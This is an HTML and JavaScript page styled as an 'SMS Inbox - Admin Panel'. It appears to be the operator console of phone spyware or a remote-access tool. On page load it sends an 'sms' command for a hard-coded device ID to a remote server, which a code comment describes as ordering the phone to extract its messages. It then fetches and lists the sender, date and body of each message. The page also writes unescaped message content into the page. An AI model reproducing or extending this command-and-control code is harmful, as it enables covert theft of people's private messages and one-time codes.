<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Inbox - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 600px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 25px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 30px; padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .back-btn {
            text-decoration: none; color: var(--text-main);
            background: var(--glass-bg); padding: 10px 15px;
            border-radius: 50%; border: 1px solid var(--glass-border);
        }

        .title { font-size: 1.5rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
        .title i { color: var(--accent); }

        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
        }

        .sms-list { display: flex; flex-direction: column; gap: 15px; max-height: 70vh; overflow-y: auto; }

        .sms-card {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            border-radius: 18px; padding: 15px; transition: 0.2s;
        }
        .sms-card:hover { border-color: var(--accent); background: rgba(255,255,255,0.08); }

        .sms-header {
            display: flex; justify-content: space-between; margin-bottom: 8px;
            font-size: 0.9rem;
        }
        .sender { font-weight: bold; color: var(--accent); }
        .date { color: var(--text-muted); font-size: 0.75rem; }

        .message-body {
            font-size: 0.95rem; color: #e0e0e0; line-height: 1.5;
            background: rgba(0,0,0,0.2); padding: 12px; border-radius: 12px;
            word-wrap: break-word;
        }

        .empty-state { text-align: center; padding: 60px; color: var(--text-muted); }
        .empty-state i { font-size: 3rem; margin-bottom: 15px; opacity: 0.5; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <div class="title"><i class="fa-solid fa-comments"></i> SMS Inbox</div>
            <button onclick="fetchSMS()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
        </div>

        <div id="sms-list" class="sms-list">
            <div class="empty-state">
                <i class="fa-solid fa-spinner fa-spin"></i>
                <p>Requesting Messages...</p>
            </div>
        </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    const DEVICE_ID = "M2103K19I"; 

    document.addEventListener("DOMContentLoaded", function() {
        sendCommand(); // Phone ko SMS nikalne ka order do
        setTimeout(fetchSMS, 6000); // 6 sec baad data check karo
    });

    function sendCommand() {
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
        }).then(() => console.log("SMS Command Sent"));
    }

    function fetchSMS() {
        const listContainer = document.getElementById("sms-list");

        // âœ… FIXED API PATH
        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${new Date().getTime()}`)
            .then(response => response.json())
            .then(data => {
                if (!data || data.length === 0) {
                    listContainer.innerHTML = `
                        <div class="empty-state">
                            <i class="fa-regular fa-envelope-open"></i>
                            <p>No SMS received yet. Click refresh in a few seconds.</p>
                        </div>`;
                    return;
                }

                listContainer.innerHTML = ""; 
                
                // Naye SMS upar dikhane ke liye reverse
                data.forEach(sms => {
                    let dateDisplay = sms.date;
                    if(!isNaN(sms.date)) {
                        dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
                    }

                    const smsCard = `
                        <div class="sms-card">
                            <div class="sms-header">
                                <span class="sender"><i class="fa-solid fa-user-secret"></i> ${sms.address || 'Unknown'}</span>
                                <span class="date">${dateDisplay}</span>
                            </div>
                            <div class="message-body">
                                ${sms.body || 'No Content'}
                            </div>
                        </div>
                    `;
                    listContainer.innerHTML += smsCard;
                });
            })
            .catch(err => {
                listContainer.innerHTML = `
                    <div class="empty-state" style="color: #ff4444;">
                        <i class="fa-solid fa-circle-exclamation"></i>
                        <p>Waiting for connection...</p>
                    </div>`;
            });
    }
</script>
</body>
</html>
